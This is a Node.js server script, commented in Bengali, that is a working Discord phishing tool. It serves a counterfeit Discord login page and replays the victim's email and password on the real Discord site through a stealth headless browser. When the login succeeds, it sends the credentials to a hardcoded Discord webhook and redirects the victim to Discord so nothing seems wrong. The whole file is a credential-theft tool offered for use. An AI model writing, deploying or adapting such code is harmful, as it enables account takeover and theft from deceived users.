const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const bodyParser = require('body-parser');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1477688091626963138/aL8J4cwOGjdMQVHCctPwtGWAhLZnuVkmHdlgRR3NSyNo5J6DxHcKSRxj5AvP-1QacAKK"; 

app.use(bodyParser.json());

// ১. ফ্রন্টএন্ড UI
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Discord | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #36393f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #2f3136; padding: 25px; border-radius: 8px; width: 90%; max-width: 360px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #1e1f22; border: none; color: white; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #5865f2; border: none; color: white; cursor: pointer; border-radius: 4px; font-weight: bold; font-size: 16px; }
        #status { font-size: 14px; color: #00aff4; margin-top: 15px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Welcome back!</h3>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log In</button>
            <div id="status">Verifying credentials... Please wait.</div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const status = document.getElementById('status');
            const btn = document.getElementById('btn');

            btn.disabled = true;
            status.style.display = 'block';

            try {
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const result = await response.json();

                if (result.status === "success") {
                    window.location.href = "https://discord.com/app";
                } else {
                    alert("Verification failed. Please check your info.");
                    btn.disabled = false;
                    status.style.display = 'none';
                }
            } catch (err) {
                alert("Connection error!");
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
    `);
});

// ২. ব্যাকএন্ড চেক লজিক
app.post('/verify', async (req, res) => {
    const { email, password } = req.body;
    console.log(`Checking: ${email}`);

    const browser = await puppeteer.launch({ 
        headless: true, // Termux/Replit এ true রাখতে হবে
        executablePath: '/usr/bin/chromium-browser', // Replit এর জন্য (Termux হলে উপরের ইন্সট্রাকশন দেখুন)
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    });

    const page = await browser.newPage();

    try {
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });

        await page.type('input[name="email"]', email, { delay: 50 });
        await page.type('input[name="password"]', password, { delay: 50 });
        await page.click('button[type="submit"]');

        // ১০ সেকেন্ড অপেক্ষা করা
        await new Promise(r => setTimeout(r, 10000));

        const currentUrl = page.url();

        // যদি URL পরিবর্তন হয় বা ড্যাশবোর্ড আসে
        if (currentUrl.includes('/channels/@me') || !currentUrl.includes('login')) {
            await axios.post(WEBHOOK_URL, {
                content: `✅ **Valid Account!**\nEmail: \`${email}\` \nPass: \`${password}\``
            });
            await browser.close();
            return res.json({ status: "success" });
        } else {
            // যদি ভুল দেখায় বা ক্যাপচাতে আটকে থাকে
            console.log("Failed or Captcha detected.");
            await browser.close();
            return res.json({ status: "wrong" });
        }

    } catch (err) {
        console.log("Error:", err.message);
        await browser.close();
        res.json({ status: "wrong" });
    }
});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
